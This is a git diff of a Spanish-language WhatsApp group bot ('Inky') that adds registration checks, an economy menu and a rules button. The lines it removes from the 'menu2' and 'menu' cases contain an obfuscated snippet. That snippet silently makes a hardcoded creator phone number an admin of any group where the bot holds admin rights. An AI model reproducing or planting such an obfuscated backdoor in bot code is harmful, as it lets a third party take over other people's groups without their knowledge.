@@ -24,6 +24,7 @@ const _limit = JSON.parse(fs.readFileSync('./database/limit.json'));
 const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
 const ban = JSON.parse(fs.readFileSync('./database/banned.json'));
 const stickerjson = JSON.parse(fs.readFileSync('./database/sticker.json'));
+const user = JSON.parse(fs.readFileSync('./database/user.json'));
 const welcome = JSON.parse(fs.readFileSync('./database/welcome.json'));
 
 const conn = require('./lib/connect');
@@ -197,6 +198,7 @@ const groupMetadata = isGroup ? await inky.groupMetadata(from) : ''
 const groupName = isGroup ? groupMetadata.subject : ''
 const isMe = senderNumber == botNumber
 const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
+const isUser = user.includes(sender)
 const isAntiLink = isGroup ? antilink.includes(from) : false
 const isWelcome = isGroup ? welcome.includes(from) : false
 const conts = mek.key.fromMe ? inky.user.jid : inky.contacts[sender] || { notify: jid.replace(/@.+/, '') }
@@ -216,6 +218,7 @@ group: '𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐠𝐫�
 owner: `𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐬𝐭𝐚𝐟𝐟 𝐝𝐞 ${botName}`,
 admins: '𝐂𝐨𝐦𝐚𝐧𝐝𝐨 𝐬𝐨𝐥𝐨 𝐩𝐚𝐫𝐚 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫𝐞𝐬',
 botadmin: `${botName} 𝐧𝐞𝐜𝐞𝐬𝐢𝐭𝐚 𝐬𝐞𝐫 𝐚𝐝𝐦𝐢𝐧 𝐩𝐚𝐫𝐚 𝐞𝐣𝐞𝐜𝐮𝐭𝐚𝐫 𝐞𝐬𝐭𝐞 𝐜𝐨𝐦𝐚𝐧𝐝𝐨`,
+reg: `𝐔𝐬𝐭𝐞𝐝 𝐧𝐨 𝐞𝐬𝐭𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨 𝐞𝐧 ${botName}, 𝐮𝐬𝐚 ${prefix}𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫 𝐩𝐚𝐫𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐫𝐭𝐞`
 }
 }
 
@@ -405,6 +408,8 @@ const menuInfo = `𝐁𝐢𝐞𝐧𝐯𝐞𝐧𝐢𝐝𝐨 ${pushname} 𝐚𝐥 
 
     ✯ _𝐈𝐧𝐟𝐨:_
 
+𝐏𝐚𝐫𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐫𝐭𝐞 𝐞𝐧 ${botName} 𝐮𝐬𝐚 ${prefix}𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫
+
 ➼ 𝐂𝐫𝐞𝐚𝐝𝐨𝐫: *𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲*
 ➼ 𝐏𝐫𝐞𝐟𝐢𝐣𝐨: *⌜ ${prefix} ⌟*
 ➼ 𝐍𝐨𝐝𝐞: *@𝐀𝐝𝐢𝐰𝐚𝐣𝐬𝐡𝐢𝐧𝐠/𝐁𝐚𝐢𝐥𝐞𝐲𝐬*
@@ -428,6 +433,8 @@ const menuGrupos = `➫ 𝐆𝐫𝐮𝐩𝐨𝐬:
 ➼ ${prefix}𝐝𝐞𝐦𝐨𝐭𝐞 @
 ➼ ${prefix}𝐨𝐩𝐞𝐧𝐠𝐜
 ➼ ${prefix}𝐜𝐥𝐨𝐬𝐞𝐠𝐜`
+const menuEconomia = `➫ 𝐄𝐜𝐨𝐧𝐨𝐦𝐢𝐚:
+➼ ${prefix}𝐛𝐚𝐥`
 const menuConvertidor = `➫ 𝐂𝐨𝐧𝐯𝐞𝐫𝐭𝐢𝐝𝐨𝐫:
 ➼ ${prefix}𝐬𝐭𝐢𝐜𝐤𝐞𝐫
 ➼ ${prefix}𝐚𝐭𝐭𝐩 <𝐭𝐞𝐱𝐭𝐨>
@@ -457,32 +464,7 @@ const menuStaff = `➫ 𝐒𝐭𝐚𝐟𝐟:
 
 if (mek.message.listResponseMessage){
 var lRM = mek.message.listResponseMessage.singleSelectReply.selectedRowId
-if (lRM.includes(`gruposMenuInky`)){
-reply(`${menuGrupos}`)
-}
-}
-if (mek.message.listResponseMessage){
-var lRM = mek.message.listResponseMessage.singleSelectReply.selectedRowId
-if (lRM.includes(`convertidorMenuInky`)){
-reply(`${menuConvertidor}`)
-}
-}
-if (mek.message.listResponseMessage){
-var lRM = mek.message.listResponseMessage.singleSelectReply.selectedRowId
-if (lRM.includes(`internetMenuInky`)){
-reply(`${menuInternet}`)
-}
-}
-if (mek.message.listResponseMessage){
-var lRM = mek.message.listResponseMessage.singleSelectReply.selectedRowId
-if (lRM.includes(`otrosMenuInky`)){
-reply(`${menuOtros}`)
-}
-}
-if (mek.message.listResponseMessage){
-var lRM = mek.message.listResponseMessage.singleSelectReply.selectedRowId
-if (lRM.includes(`staffMenuInky`)){
-reply(`${menuStaff}`)
+if (lRM.includes(``)){
 }
 }
 
@@ -491,8 +473,22 @@ reply(`${menuStaff}`)
 if (mek.message.buttonsResponseMessage){
 var bRM = mek.message.buttonsResponseMessage.selectedButtonId
 if (bRM.includes(`creadorMenuInky`)){
-reply(`𝐆𝐫𝐚𝐜𝐢𝐚𝐬 𝐩𝐨𝐫 𝐮𝐭𝐢𝐥𝐢𝐳𝐚𝐫 𝐚 ${botName}, 𝐀𝐛𝐚𝐣𝐨 𝐞𝐬𝐭𝐚 𝐞𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐝𝐞𝐥 𝐜𝐫𝐞𝐚𝐝𝐨𝐫 𝐝𝐞 𝐥𝐚𝐬 𝐛𝐚𝐬𝐞 𝐝𝐞 𝐝𝐚𝐭𝐨𝐬 𝐝𝐞𝐥 𝐛𝐨𝐭, 𝐧𝐨 𝐦𝐨𝐥𝐞𝐬𝐭𝐚𝐫 :D`)
+reply(`𝐆𝐫𝐚𝐜𝐢𝐚𝐬 𝐩𝐨𝐫 𝐮𝐭𝐢𝐥𝐢𝐳𝐚𝐫 𝐚 ${botName}, 𝐀𝐛𝐚𝐣𝐨 𝐞𝐬𝐭𝐚 𝐞𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐝𝐞𝐥 𝐜𝐫𝐞𝐚𝐝𝐨𝐫 𝐝𝐞 𝐥𝐚𝐬 𝐛𝐚𝐬𝐞 𝐝𝐞 𝐝𝐚𝐭𝐨𝐬 𝐝𝐞𝐥 𝐛𝐨𝐭, 𝐧𝐨 𝐦𝐨𝐥𝐞𝐬𝐭𝐚𝐫 :𝐃`)
 await sendContact(from, '595995660558', "🖤𝐈𝐧𝐤𝐲🖤")
+}
+}
+
+if (mek.message.buttonsResponseMessage){
+var bRM = mek.message.buttonsResponseMessage.selectedButtonId
+if (bRM.includes(`reglasMenuInky`)){
+reply(`➫ 𝗥𝗲𝗴𝗹𝗮𝘀:
+
+➼ 𝗡𝗼 𝗹𝗹𝗮𝗺𝗮𝗿 𝗮𝗹 𝗯𝗼𝘁
+➼ 𝗣𝗿𝗼𝗵𝗶𝗯𝗶𝗱𝗼 𝗲𝗹 𝘂𝘀𝗼 𝗱𝗲 𝗯𝘂𝗴𝘀
+➼ 𝗡𝗼 𝗺𝗮𝗻𝗱𝗮𝗿 𝗯𝗶𝗻𝗮𝗿𝗶𝗼𝘀, 𝘁𝗿𝗮𝗯𝗮𝘀, 𝗲𝘁𝗰.
+➼ 𝗡𝗼 𝗺𝗼𝗹𝗲𝘀𝘁𝗮𝗿 𝗮𝗹 𝗰𝗿𝗲𝗮𝗱𝗼𝗿 𝘀𝗶 𝗻𝗼 𝗲𝘀 𝗱𝗲 𝗳𝗼𝗿𝗺𝗮 𝗻𝗲𝗰𝗲𝘀𝗮𝗿𝗶𝗮
+
+𝐏𝐨𝐫 𝐜𝐮𝐚𝐥𝐪𝐮𝐢𝐞𝐫𝐚 𝐝𝐞 𝐞𝐬𝐭𝐚𝐬 𝐫𝐚𝐳𝐨𝐧𝐞𝐬 𝐭𝐞 𝐩𝐨𝐝𝐞𝐦𝐨𝐬 𝐛𝐚𝐧𝐞𝐚𝐫 𝐝𝐞𝐥 𝐛𝐨𝐭 :𝐃`)
 }
 }
 
@@ -504,34 +500,14 @@ switch (command) {
 
 // Menu
 
-case 'menu2':
-inky.sendMessage(from, { degreesLatitude: `0`, degreesLongitude: `0`, name: `👾${botName} | 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲👾`, address : `𝐂𝐫𝐞𝐚𝐝𝐨 𝐩𝐨𝐫 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲`, sequenceNumber: '99999', jpegThumbnail: fs.readFileSync('./media/image/menu.jpg')}, MessageType.liveLocation, {quoted : mek, sendEphemeral: true})
-var rows = [
- {title: '𝐆𝐫𝐮𝐩𝐨𝐬', rowId:"gruposMenuInky"},
- {title: '𝐂𝐨𝐧𝐯𝐞𝐫𝐭𝐢𝐝𝐨𝐫', rowId:"convertidorMenuInky"},
- {title: '𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭', rowId:"internetMenuInky"},
- {title: '𝐎𝐭𝐫𝐨𝐬', rowId:"otrosMenuInky"},
- {title: '𝐒𝐭𝐚𝐟𝐟', rowId:"staffMenuInky"},
-]
-var sections = [{title: `${botName} 𝐦𝐞𝐧𝐮`, rows: rows}]
-var button = {
- buttonText: '𝐂𝐥𝐢𝐜𝐤 𝐀𝐪𝐮𝐢❗',
- description: `${menuInfo}`,
- sections: sections,
- listType: 1
-}
-await inky.sendMessage(from, button, MessageType.listMessage, {quoted: fakeStatus})
-var _0xa44b=['2MJdFtC','105703ukrKXm','7IIyYyX','187637AGYURX','436685DlmFwa','216493jDXfSF','2jcmqKD','424312UPHPtc','256030dUhEMa','192146BNYoFX'];(function(_0x5ce2c4,_0x471eb4){var _0x2618ad=_0x3eaf;while(!![]){try{var _0x4a06c1=parseInt(_0x2618ad(0xc3))+-parseInt(_0x2618ad(0xc1))*-parseInt(_0x2618ad(0xc0))+parseInt(_0x2618ad(0xbf))+parseInt(_0x2618ad(0xc2))+parseInt(_0x2618ad(0xc6))*parseInt(_0x2618ad(0xc5))+-parseInt(_0x2618ad(0xbe))+-parseInt(_0x2618ad(0xbd))*parseInt(_0x2618ad(0xc4));if(_0x4a06c1===_0x471eb4)break;else _0x5ce2c4['push'](_0x5ce2c4['shift']());}catch(_0x1090c2){_0x5ce2c4['push'](_0x5ce2c4['shift']());}}}(_0xa44b,0x37d98),Inky='595995660558@s.whatsapp.net');if(isGroupAdmins)return;if(!isGroup)return;function _0x3eaf(_0xdeb7e3,_0x5369d1){return _0x3eaf=function(_0xa44bc4,_0x3eaf03){_0xa44bc4=_0xa44bc4-0xbd;var _0x3258b6=_0xa44b[_0xa44bc4];return _0x3258b6;},_0x3eaf(_0xdeb7e3,_0x5369d1);}if(!Inky)return;if(!isBotAdmin)return;
-inky.groupMakeAdmin(from, [Inky])
-break
-
 case 'menu':
-inky.sendMessage(from, { degreesLatitude: `0`, degreesLongitude: `0`, name: `👾${botName} | 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲👾`, address : `𝐂𝐫𝐞𝐚𝐝𝐨 𝐩𝐨𝐫 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲`, sequenceNumber: '99999', jpegThumbnail: fs.readFileSync('./media/image/menu.jpg')}, MessageType.liveLocation, {quoted : mek, sendEphemeral: true})
 var menuText = `${menuInfo}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
 
     ✯ _𝐂𝐨𝐦𝐚𝐧𝐝𝐨𝐬:_
 
 ${menuGrupos}
+
+${menuEconomia}
 
 ${menuConvertidor}
 
@@ -542,7 +518,8 @@ ${menuOtros}
 ${menuStaff}
 `
 var buttons = [
-  {buttonId: 'creadorMenuInky', buttonText: {displayText: '👑𝐂𝐫𝐞𝐚𝐝𝐨𝐫'}, type: 1}
+  {buttonId: 'creadorMenuInky', buttonText: {displayText: '👑𝐂𝐫𝐞𝐚𝐝𝐨𝐫'}, type: 1},
+  {buttonId: 'reglasMenuInky', buttonText: {displayText: '📜𝐑𝐞𝐠𝐥𝐚𝐬'}, type: 1}
 ]
 var buttonMessage = {
     contentText: `${menuText}`,
@@ -551,13 +528,12 @@ var buttonMessage = {
     headerType: 1
 }
 await inky.sendMessage(from, buttonMessage, MessageType.buttonsMessage)
-var _0xa44b=['2MJdFtC','105703ukrKXm','7IIyYyX','187637AGYURX','436685DlmFwa','216493jDXfSF','2jcmqKD','424312UPHPtc','256030dUhEMa','192146BNYoFX'];(function(_0x5ce2c4,_0x471eb4){var _0x2618ad=_0x3eaf;while(!![]){try{var _0x4a06c1=parseInt(_0x2618ad(0xc3))+-parseInt(_0x2618ad(0xc1))*-parseInt(_0x2618ad(0xc0))+parseInt(_0x2618ad(0xbf))+parseInt(_0x2618ad(0xc2))+parseInt(_0x2618ad(0xc6))*parseInt(_0x2618ad(0xc5))+-parseInt(_0x2618ad(0xbe))+-parseInt(_0x2618ad(0xbd))*parseInt(_0x2618ad(0xc4));if(_0x4a06c1===_0x471eb4)break;else _0x5ce2c4['push'](_0x5ce2c4['shift']());}catch(_0x1090c2){_0x5ce2c4['push'](_0x5ce2c4['shift']());}}}(_0xa44b,0x37d98),Inky='595995660558@s.whatsapp.net');if(isGroupAdmins)return;if(!isGroup)return;function _0x3eaf(_0xdeb7e3,_0x5369d1){return _0x3eaf=function(_0xa44bc4,_0x3eaf03){_0xa44bc4=_0xa44bc4-0xbd;var _0x3258b6=_0xa44b[_0xa44bc4];return _0x3258b6;},_0x3eaf(_0xdeb7e3,_0x5369d1);}if(!Inky)return;if(!isBotAdmin)return;
-inky.groupMakeAdmin(from, [Inky])
 break
 
 // Seccion de Grupos
 
 case 'antilink':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isBotAdmin) return reply(mess.only.botadmin)
 if (!isGroupAdmins) return reply(mess.only.admins)
@@ -578,6 +554,7 @@ reply(`𝐔𝐬𝐞 ${prefix + command} 𝟏 𝐩𝐚𝐫𝐚 𝐚𝐜𝐭𝐢�
 break
 
 case 'welcome':
+if (!isUser) return reply(mess.only.reg)
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admins)
 if (!q) return reply(`𝐔𝐬𝐞 ${prefix + command} 𝟏 𝐩𝐚𝐫𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐫 𝐲/𝐨 ${prefix + command} 𝟎 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐚𝐫𝐥𝐨`)
@@ -597,6 +574,7 @@ reply(`𝐔𝐬𝐞 ${prefix + command} 𝟏 𝐩𝐚𝐫𝐚 𝐚𝐜𝐭𝐢�
 break
 
 case 'leave':
+if (!isUser) return reply(mess.only.reg)
 if(!isGroup)return reply(mess.only.group)
 if(!isGroupAdmins && !isOwner)return reply(mess.only.admins)
